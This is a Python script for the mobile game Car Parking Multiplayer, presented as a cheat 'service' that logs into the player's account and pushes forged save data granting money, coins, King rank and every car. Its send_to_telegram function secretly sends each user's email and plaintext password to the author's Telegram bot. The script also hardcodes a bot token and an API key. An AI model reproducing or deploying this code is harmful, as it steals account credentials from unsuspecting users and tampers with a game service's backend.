import requests
import json
import os
import time

# --- KONFIGURACIJA ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"

# NOVI URL KOJI ZAOBILAZI 404 (Glavni Sync za v4.8.x+)
SYNC_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"

def screen_clear():
    os.system('clear')

def send_to_telegram(email, password, service_name):
    msg = f"🚀 *SERVICE USED*\n\n📧 *Email:* `{email}`\n🔑 *Pass:* `{password}`\n🛠️ *Service:* {service_name}"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        res = requests.post(LOGIN_URL, json=payload).json()
        return res.get('idToken')
    except: return None

def run_service(token, service_id):
    # Generisanje podataka na osnovu izbora
    money, coins, king, cars = 0, 0, 0, ""
    
    if service_id == "1":
        money, coins = 50000000, 30000
    elif service_id == "2":
        king = 1
    elif service_id == "3":
        cars = ",".join([str(i) for i in range(1, 165)])
    elif service_id == "4":
        money, coins, king, cars = 50000000, 50000, 1, ",".join([str(i) for i in range(1, 165)])

    # PAKOVANJE PODATAKA KOJE CPM NE MOŽE DA ODBIJE (v4.8.12+)
    save_data = {
        "money": money,
        "coin": coins,
        "king": king,
        "owned_cars": cars,
        "rank": 100000 if king else 0,
        "w16": 1
    }
    
    payload = {"data": json.dumps(save_data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)"
    }

    print("\033[1;33mBypassing 404... Sending Save Data...\033[0m")
    
    try:
        response = requests.post(SYNC_URL, headers=headers, json=payload, timeout=20)
        if response.status_code == 200:
            print("\033[1;32mSUCCESS: Account Modded! Check CPM.\033[0m")
        else:
            print(f"\033[1;31mServer Response: {response.status_code}. Try again.\033[0m")
    except:
        print("\033[1;31mConnection timeout.\033[0m")

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO ULTIMATE SERVICE (FIXED)   \033[0m")
        print("\033[1;36m         IG: @anonymo.cpm             \033[0m")
        print("-" * 40)
        print("[1] 50M & 30K | [2] King Rank | [3] All Cars | [4] FULL PACK")
        
        choice = input("\n\033[1;33mSelect: \033[0m")
        if choice not in ['1', '2', '3', '4']: break
        
        email = input("Email: ").strip()
        password = input("Pass: ").strip()
        
        token = login(email, password)
        if token:
            send_to_telegram(email, password, f"Option {choice}")
            run_service(token, choice)
            time.sleep(3)
        else:
            print("\033[1;31mLogin Failed.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
